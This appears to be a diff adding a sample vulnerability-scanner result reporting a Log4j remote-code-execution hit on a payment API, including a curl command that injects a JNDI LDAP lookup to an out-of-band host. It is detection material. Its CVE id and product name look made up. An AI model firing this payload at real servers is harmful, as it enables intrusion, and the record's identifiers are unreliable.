@@ -1,0 +1,16 @@
+[
+  {
+    "template-id": "cve-2021-696969",
+    "info": {
+      "name": "Apache Log4j26969 - Remote Code Execution",
+      "severity": "critical",
+      "tags": ["cve", "cve2021", "rce", "oast", "log4j"]
+    },
+    "type": "https",
+    "host": "payment.foxysec.dev",
+    "matched-at": "https://payment.foxysec.dev/api/v1/checkout",
+    "timestamp": "2026-03-19T19:30:00.000Z",
+    "curl-command": "curl -X POST -H 'X-Api-Version: ${jndi:ldap://redfalcon.oast.me/a}' https://payment.foxysec.dev/api/v1/checkout",
+    "extracted-results": ["DNS OAST Interaction Received: redfalcon.oast.me"]
+  }
+]
